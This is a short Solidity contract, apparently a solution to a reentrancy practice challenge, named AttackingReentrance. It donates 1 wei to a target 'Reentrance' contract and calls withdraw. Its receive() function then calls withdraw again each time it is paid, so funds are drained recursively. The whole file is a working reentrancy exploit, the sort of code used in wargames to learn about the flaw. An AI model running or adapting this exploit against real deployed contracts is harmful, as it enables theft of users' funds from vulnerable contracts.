// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    Reentrance public target;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        target = Reentrance(contractAddress);
    }

    function hackContract() external {
        target.donate{value: 1}(address(this));
        target.withdraw();
    }

    receive() external payable {
        require(msg.value >= 1);
        target.withdraw();
    }
}
